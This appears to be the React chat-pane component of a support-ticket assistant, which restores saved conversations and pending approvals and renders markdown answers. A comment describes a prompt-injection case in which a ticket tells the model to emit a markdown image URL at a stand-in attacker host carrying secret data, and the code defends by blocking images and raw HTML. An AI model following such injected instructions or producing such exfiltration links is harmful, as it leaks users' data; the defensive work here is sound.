/** The chat pane: assistant-ui's primitives (unstyled building blocks) wired to our adapter. */

import {
  AssistantRuntimeProvider,
  ComposerPrimitive,
  MessagePrimitive,
  type TextMessagePartComponent,
  type ThreadMessageLike,
  ThreadPrimitive,
  useLocalRuntime,
} from "@assistant-ui/react";
import { MarkdownTextPrimitive } from "@assistant-ui/react-markdown";
import { useEffect, useMemo, useState } from "react";
import remarkGfm from "remark-gfm";

import { listMessages, type SavedMessage, type Tenant } from "../api";
import { approvalPart, createAdapter, REQUIRES_APPROVAL } from "./adapter";
import { MutateTicketCall, ToolCall } from "./ToolCall";

type ChatProps = { tenant: Tenant; conversationId: string; onTicketsChanged: () => void };

/** Loads the conversation's saved messages, then shows the chat starting from them. */
export function Chat({ tenant, conversationId, onTicketsChanged }: ChatProps) {
  const [history, setHistory] = useState<ThreadMessageLike[] | null>(null);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    let cancelled = false;

    listMessages(tenant, conversationId)
      .then((messages) => {
        if (cancelled) return;
        setHistory(messages.map((message, i) => toThreadMessage(message, i === messages.length - 1)));
      })
      .catch((reason: unknown) => !cancelled && setError(String(reason)));

    return () => {
      cancelled = true;
    };
  }, [tenant, conversationId]);

  if (error) return <p className="error">Could not load the conversation: {error}</p>;
  if (!history) return <p className="placeholder">Loading…</p>;
  return (
    <ChatThread tenant={tenant} conversationId={conversationId} onTicketsChanged={onTicketsChanged} history={history} />
  );
}

/**
 * A saved message as assistant-ui shows it. An approval request that is the last message is still
 * pending: it becomes the tool calls with the approval modal, as during the live run. Approving
 * then resumes the run through the adapter. An earlier, already answered one stays text.
 */
function toThreadMessage(message: SavedMessage, isLast: boolean): ThreadMessageLike {
  const createdAt = new Date(message.created_at);

  if (isLast && message.actions) {
    return { role: "assistant", content: message.actions.map(approvalPart), status: REQUIRES_APPROVAL, createdAt };
  }
  return { role: message.role, content: message.content, createdAt };
}

function ChatThread({
  tenant,
  conversationId,
  onTicketsChanged,
  history,
}: ChatProps & { history: ThreadMessageLike[] }) {
  const adapter = useMemo(
    () => createAdapter(tenant, conversationId, onTicketsChanged),
    [tenant, conversationId, onTicketsChanged],
  );
  // initialMessages is read once: the runtime keeps the chat state from then on.
  const runtime = useLocalRuntime(adapter, { initialMessages: history });

  return (
    <AssistantRuntimeProvider runtime={runtime}>
      <ThreadPrimitive.Root className="thread">
        <ThreadPrimitive.Viewport className="thread-viewport">
          <ThreadPrimitive.Empty>
            <p className="thread-empty">Ask about your tickets, e.g. "What are my open tickets?"</p>
          </ThreadPrimitive.Empty>

          <ThreadPrimitive.Messages>
            {({ message }) => (message.role === "user" ? <UserMessage /> : <AssistantMessage />)}
          </ThreadPrimitive.Messages>
        </ThreadPrimitive.Viewport>

        <ComposerPrimitive.Root className="composer">
          <ComposerPrimitive.Input className="composer-input" placeholder="Message the assistant…" />
          <ComposerPrimitive.Send className="composer-send">Send</ComposerPrimitive.Send>
        </ComposerPrimitive.Root>
      </ThreadPrimitive.Root>
    </AssistantRuntimeProvider>
  );
}

const Text: TextMessagePartComponent = ({ text }) => <p className="message-text">{text}</p>;

// Images are never loaded. A ticket can tell the model to add ![](https://attacker/?d=<secret data>);
// the browser would fetch that URL as soon as it renders the answer, sending the data out with no
// click and no tool call (ticket #6). We show the image's alt text and address instead.
const BlockedImage = ({ alt, src }: { alt?: string; src?: string }) => (
  <span className="blocked-image">
    [image not loaded: {alt || "no description"}, {src}]
  </span>
);

// The assistant's answers as markdown (GitHub flavour: tables, lists, ...). Raw HTML in the text is
// not rendered, so HTML copied from a ticket into an answer can't inject anything into the page.
const MarkdownText: TextMessagePartComponent = () => (
  <MarkdownTextPrimitive className="markdown" remarkPlugins={[remarkGfm]} components={{ img: BlockedImage }} />
);

function UserMessage() {
  return (
    <MessagePrimitive.Root className="message user">
      <MessagePrimitive.Parts components={{ Text }} />
    </MessagePrimitive.Root>
  );
}

function AssistantMessage() {
  return (
    <MessagePrimitive.Root className="message assistant">
      <MessagePrimitive.Parts
        components={{
          Text: MarkdownText,
          tools: { by_name: { mutate_ticket: MutateTicketCall }, Fallback: ToolCall },
        }}
      />
    </MessagePrimitive.Root>
  );
}
